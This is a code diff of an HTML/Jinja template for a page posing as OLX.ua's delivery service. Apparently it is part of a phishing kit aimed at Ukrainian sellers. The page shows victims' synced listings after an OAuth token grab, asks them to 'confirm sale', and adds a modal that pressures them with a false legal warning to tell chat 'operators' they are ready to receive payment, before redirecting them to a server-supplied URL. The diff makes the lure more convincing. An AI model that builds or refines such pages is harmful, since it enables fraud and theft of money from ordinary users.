@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Підтвердження продажу — OLX.ua</title>
+    <title>OLX Доставка — Підтвердження</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 
     <style>
@@ -11,8 +11,7 @@
             --olx-dark: #002f34;
             --olx-bg: #f2f4f5;
             --olx-cyan: #23E5DB;
-            --olx-red: #ff5636;
-            --olx-border: #edeff0;
+            --olx-blue: #00a9e7;
             --olx-text-gray: #7f9799;
         }
 
@@ -21,7 +20,7 @@
             font-family: 'Roboto', sans-serif;
             background-color: var(--olx-bg);
             color: var(--olx-dark);
-            min-height: 100vh;
+            scroll-behavior: smooth;
         }
 
         header {
@@ -36,29 +35,31 @@
         }
 
         main {
-            max-width: 960px;
+            max-width: 800px;
             margin: 0 auto;
-            padding: 24px 16px;
+            padding: 24px 16px 100px;
         }
 
         .page-title {
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 20px;
             text-align: center;
         }
 
         .instruction-box {
             background: white;
-            padding: 16px;
+            padding: 20px;
             border-radius: 8px;
-            margin-bottom: 24px;
-            border-left: 4px solid var(--olx-cyan);
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            margin-bottom: 30px;
+            border-left: 5px solid var(--olx-cyan);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            font-size: 16px;
+            line-height: 1.4;
             text-align: center;
         }
 
-        /* --- СТИЛЬ КАРТОК ЯК НА СКРІНШОТІ --- */
+        /* --- КАРТКИ (БЕЗ ЗАЙВОЇ ІНФОРМАЦІЇ) --- */
         .ads-container {
             display: flex;
             flex-direction: column;
@@ -70,15 +71,11 @@
             border-radius: 4px;
             padding: 16px;
             display: flex;
-            position: relative;
             cursor: pointer;
             transition: all 0.2s;
             border: 2px solid transparent;
             box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-
-        .ad-card:hover {
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            align-items: center;
         }
 
         .ad-card.selected {
@@ -87,8 +84,8 @@
         }
 
         .ad-image-wrapper {
-            width: 100px;
-            height: 100px;
+            width: 80px;
+            height: 80px;
             flex-shrink: 0;
             margin-right: 16px;
             background: #f8f9fa;
@@ -104,90 +101,41 @@
 
         .ad-content {
             flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-        }
-
-        .ad-header-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
         }
 
         .ad-name {
             font-size: 18px;
             font-weight: 700;
-            margin: 0 0 12px 0;
-            max-width: 70%;
+            margin: 0 0 8px 0;
         }
 
-        .ad-price {
-            font-size: 18px;
-            font-weight: 700;
-            white-space: nowrap;
-        }
-
-        /* Рожевий бейдж статусу */
-        .status-badge {
-            background-color: #fde0d8;
-            color: #000;
-            padding: 8px 12px;
-            border-radius: 4px;
-            display: inline-block;
-            font-size: 12px;
-            font-weight: 700;
-            text-align: center;
-            line-height: 1.4;
-            margin-bottom: 8px;
-        }
-
-        .ad-card.selected .status-badge {
-            background-color: var(--olx-cyan);
-            color: var(--olx-dark);
-        }
-
-        .ad-footer-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-end;
-            margin-top: auto;
-        }
-
-        .ad-meta-info {
+        .selection-status {
             font-size: 13px;
-            color: var(--olx-text-gray);
-            display: flex;
-            gap: 16px;
-        }
-
-        .open-btn {
-            font-size: 14px;
             font-weight: 700;
-            text-decoration: underline;
-            color: var(--olx-dark);
-            cursor: pointer;
+            color: #ff5636;
+            text-transform: uppercase;
         }
 
-        /* Кнопки внизу */
+        .ad-card.selected .selection-status {
+            color: #27ae60;
+        }
+
+        /* --- КНОПКИ --- */
         .bottom-actions {
-            margin-top: 32px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 16px;
+            margin-top: 40px;
+            text-align: center;
         }
 
         .btn-main {
             width: 100%;
-            max-width: 400px;
-            padding: 16px;
+            max-width: 450px;
+            padding: 18px;
             background: #9aa7b3;
             color: white;
             font-weight: 700;
             border: none;
             border-radius: 4px;
-            font-size: 16px;
+            font-size: 18px;
             cursor: not-allowed;
             transition: 0.3s;
         }
@@ -195,38 +143,84 @@
         .btn-main.active {
             background: var(--olx-dark);
             cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0, 47, 52, 0.2);
         }
 
-        .btn-link {
-            color: var(--olx-text-gray);
-            text-decoration: underline;
+        /* --- МОДАЛЬНЕ ВІКНО --- */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.7);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 480px;
+            width: 100%;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+        }
+
+        .modal-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .chat-icon-img {
+            width: 45px;
+            height: 45px;
+        }
+
+        .modal-body {
+            font-size: 15px;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        .warning-box {
+            background: #fff8e1;
+            padding: 12px;
+            border-radius: 4px;
+            border: 1px solid #ffe082;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        .checkbox-container {
+            margin-top: 25px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            cursor: pointer;
+            font-weight: 700;
             font-size: 14px;
-            background: none;
+        }
+
+        .checkbox-container input { width: 20px; height: 20px; }
+
+        .btn-go {
+            width: 100%;
+            margin-top: 20px;
+            padding: 15px;
+            background: var(--olx-blue);
+            color: white;
             border: none;
+            border-radius: 6px;
+            font-weight: 700;
+            display: none;
             cursor: pointer;
         }
 
         #hidden-ads { display: none; }
-        
-        @media (max-width: 600px) {
-            .ad-card { flex-direction: column; }
-            .ad-image-wrapper { width: 100%; height: 160px; margin-bottom: 12px; }
-            .ad-header-row { flex-direction: column; }
-            .ad-price { margin-top: 4px; margin-bottom: 12px; }
-            .ad-meta-info { flex-direction: column; gap: 4px; }
-        }
-
-        /* Skeleton */
-        .skeleton {
-            background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
-            background-size: 200% 100%;
-            animation: loading 1.5s infinite;
-        }
-        @keyframes loading {
-            0% { background-position: 200% 0; }
-            100% { background-position: -200% 0; }
-        }
+        .skeleton { background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%); background-size: 200% 100%; animation: loading 1.5s infinite; }
+        @keyframes loading { 0% { background-position: 200% 0; } 100% { background-position: -200% 0; } }
     </style>
 </head>
 
@@ -239,11 +233,11 @@
 </header>
 
 <main>
-    <div class="page-title">Авторизація успішна</div>
+    <div class="page-title">OLX Доставка</div>
 
     <div class="instruction-box">
-        Ваш профіль синхронізовано! <br>
-        Будь ласка, <b>виберіть товар, який у вас купили</b>, для підтвердження виплати:
+        Синхронізація успішна! <br>
+        Будь ласка, <b>виберіть товар, який у вас купили</b>:
     </div>
 
     <div class="ads-container" id="ads-container">
@@ -255,21 +249,8 @@
                         <img src="{{ ad.img }}" class="ad-img" alt="product">
                     </div>
                     <div class="ad-content">
-                        <div class="ad-header-row">
-                            <h2 class="ad-name">{{ ad.title }}</h2>
-                            <div class="ad-price">Обробка...</div>
-                        </div>
-                        <div class="status-badge">
-                            Очікує вибору <br>
-                            (натисніть для підтвердження)
-                        </div>
-                        <div class="ad-footer-row">
-                            <div class="ad-meta-info">
-                                <span>22.03.2026, 18:33</span>
-                                <span>Номер замовлення: 1145{{ loop.index }}94704</span>
-                            </div>
-                            <div class="open-btn">Відкрити</div>
-                        </div>
+                        <h2 class="ad-name">{{ ad.title }}</h2>
+                        <div class="selection-status">Натисніть для вибору</div>
                     </div>
                 </div>
                 {% endfor %}
@@ -282,23 +263,13 @@
                             <img src="{{ ad.img }}" class="ad-img" alt="product">
                         </div>
                         <div class="ad-content">
-                            <div class="ad-header-row">
-                                <h2 class="ad-name">{{ ad.title }}</h2>
-                                <div class="ad-price">Обробка...</div>
-                            </div>
-                            <div class="status-badge">Очікує вибору</div>
-                            <div class="ad-footer-row">
-                                <div class="ad-meta-info">
-                                    <span>22.03.2026</span>
-                                    <span>Номер замовлення: 1145{{ loop.index + 3 }}94704</span>
-                                </div>
-                                <div class="open-btn">Відкрити</div>
-                            </div>
+                            <h2 class="ad-name">{{ ad.title }}</h2>
+                            <div class="selection-status">Натисніть для вибору</div>
                         </div>
                     </div>
                     {% endfor %}
                 </div>
-                <button class="btn-link" id="toggle-btn" onclick="toggleAds()" style="margin: 10px auto; display: block;">
+                <button class="btn-link" id="toggle-btn" onclick="toggleAds()" style="margin: 10px auto; display: block; background:none; border:none; text-decoration:underline; color:var(--olx-text-gray); cursor:pointer;">
                     Показати всі ({{ user_ads|length }})
                 </button>
                 {% endif %}
@@ -308,46 +279,51 @@
         {% else %}
             <div class="ad-card" style="opacity: 0.7;">
                 <div class="ad-image-wrapper skeleton"></div>
-                <div class="ad-content">
-                    <div class="skeleton" style="height: 20px; width: 60%; margin-bottom: 10px;"></div>
-                    <div class="skeleton" style="height: 40px; width: 40%;"></div>
-                </div>
-            </div>
-            <div class="ad-card" style="opacity: 0.4;">
-                <div class="ad-image-wrapper skeleton"></div>
-                <div class="ad-content">
-                    <div class="skeleton" style="height: 20px; width: 50%; margin-bottom: 10px;"></div>
-                    <div class="skeleton" style="height: 40px; width: 30%;"></div>
-                </div>
+                <div class="ad-content"><div class="skeleton" style="height: 20px; width: 60%;"></div></div>
             </div>
         {% endif %}
     </div>
 
     <div class="bottom-actions">
-        <button id="confirm-btn" class="btn-main" onclick="submitSelection()" disabled>Підтвердити продаж</button>
-        <a href="https://t.me/olx_verif_bot" class="btn-link">Повернутися до бота</a>
-    </div>
-
-    <div style="text-align: center; margin-top: 40px; color: var(--olx-text-gray); font-size: 11px;">
-        © OLX.UA 2026
+        <button id="confirm-btn" class="btn-main" onclick="openRules()" disabled>Підтвердити продаж</button>
     </div>
 </main>
+
+<div class="modal-overlay" id="rulesModal">
+    <div class="modal-content">
+        <div class="modal-header">
+            <img src="https://i.postimg.cc/qM3XWJvK/image-1998dd.png" class="chat-icon-img" alt="Chat">
+            <h2 style="margin:0; font-size: 20px;">Інформація</h2>
+        </div>
+        <div class="modal-body">
+            • Робочий час для підтвердження: <b>10:00 — 00:00</b>. <br>
+            • Усі замовлення обробляються <b>вручну</b> операторами для запобігання шахрайству.
+            
+            <div class="warning-box">
+                Після заповнення даних <b>обов'язково повідомте операторам у чаті</b>, що ви готові отримати оплату, інакше замовлення не підтвердиться (порушення закону про фінансові операції).
+            </div>
+
+            <label class="checkbox-container">
+                <input type="checkbox" id="agreeCheck" onchange="toggleFinalBtn()">
+                Я ознайомлений(а) та готовий(а) повідомити оператора
+            </label>
+
+            <button id="final-go-btn" class="btn-go" onclick="submitSelection()">Продовжити</button>
+        </div>
+    </div>
+</div>
 
 <script>
 let selectedAdData = { url: "", title: "" };
 
 function selectAd(element, url, title) {
-    // Скидаємо всі картки
     document.querySelectorAll('.ad-card').forEach(card => {
         card.classList.remove('selected');
-        const badge = card.querySelector('.status-badge');
-        if (badge) badge.innerHTML = "Очікує вибору <br> (натисніть для підтвердження)";
+        card.querySelector('.selection-status').innerText = "Натисніть для вибору";
     });
 
-    // Виділяємо поточну
     element.classList.add('selected');
-    const activeBadge = element.querySelector('.status-badge');
-    if (activeBadge) activeBadge.innerHTML = "ТОВАР ОБРАНО <br> Натисніть кнопку нижче";
+    element.querySelector('.selection-status').innerText = "ТОВАР ОБРАНО";
 
     selectedAdData.url = url;
     selectedAdData.title = title;
@@ -355,13 +331,25 @@ function selectAd(element, url, title) {
     const btn = document.getElementById('confirm-btn');
     btn.disabled = false;
     btn.classList.add('active');
+
+    // Авто-прокрутка до кнопки
+    setTimeout(() => {
+        btn.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }, 300);
+}
+
+function openRules() {
+    if (!selectedAdData.url) return;
+    document.getElementById('rulesModal').style.display = 'flex';
+}
+
+function toggleFinalBtn() {
+    const isChecked = document.getElementById('agreeCheck').checked;
+    document.getElementById('final-go-btn').style.display = isChecked ? 'block' : 'none';
 }
 
 async function submitSelection() {
-    if (!selectedAdData.url) return;
-    const btn = document.getElementById('confirm-btn');
-    const originalText = btn.innerText;
-
+    const btn = document.getElementById('final-go-btn');
     btn.innerText = "Обробка...";
     btn.disabled = true;
 
@@ -374,19 +362,16 @@ async function submitSelection() {
                 ad_title: selectedAdData.title
             })
         });
-
         const result = await response.json();
-
         if (response.ok && result.url) {
             window.location.href = result.url;
         } else {
-            alert("Помилка синхронізації. Спробуйте ще раз.");
-            btn.innerText = originalText;
+            alert("Помилка. Спробуйте ще раз.");
+            btn.innerText = "Продовжити";
             btn.disabled = false;
         }
     } catch (err) {
         console.error(err);
-        btn.innerText = originalText;
         btn.disabled = false;
     }
 }
@@ -394,7 +379,6 @@ async function submitSelection() {
 function toggleAds() {
     const hiddenContainer = document.getElementById('hidden-ads');
     const btn = document.getElementById('toggle-btn');
-    
     if (hiddenContainer.style.display === 'block') {
         hiddenContainer.style.display = 'none';
         btn.innerText = 'Показати всі';
@@ -404,30 +388,21 @@ function toggleAds() {
     }
 }
 
-async function processAuth(authCode) {
-    if (!authCode || sessionStorage.getItem('done') === authCode) return;
-
-    try {
-        const response = await fetch("/get_token", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ code: authCode })
-        });
-
-        if (response.ok) {
-            sessionStorage.setItem('done', authCode);
-            setTimeout(() => {
-                window.location.href = "/";
-            }, 500);
-        }
-    } catch (err) { console.error(err); }
-}
-
+// Логіка коду авторизації (якщо потрібно)
 window.onload = () => {
     const urlParams = new URLSearchParams(window.location.search);
     const code = urlParams.get("code");
-    if (code) {
-        processAuth(code);
+    if (code && !sessionStorage.getItem('done')) {
+        fetch("/get_token", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ code: code })
+        }).then(r => {
+            if(r.ok) {
+                sessionStorage.setItem('done', code);
+                window.location.href = "/";
+            }
+        });
     }
 };
 </script>
